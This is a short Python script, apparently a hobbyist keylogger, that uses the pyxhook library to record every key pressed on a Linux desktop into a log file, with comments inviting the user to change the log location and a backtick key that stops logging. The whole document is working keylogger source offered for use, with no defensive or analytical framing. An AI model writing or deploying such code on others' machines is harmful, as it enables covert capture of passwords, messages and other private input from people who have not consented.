import pyxhook

#This tells the keylogger where the log will go. Change it to direct to where you want it.

log_file='/home/Giacomo/Desktop/file.log'

#The file will automatically appear on the desktop. You may want to edit the location!

def OnKeyPress(event):

  fob=open(log_file,'a')

  fob.write(event.Key)

  fob.write('\n')



  if event.Ascii==96: 

    fob.close()

    new_hook.cancel()

new_hook=pyxhook.HookManager()

new_hook.KeyDown=OnKeyPress

new_hook.HookKeyboard()

new_hook.start()
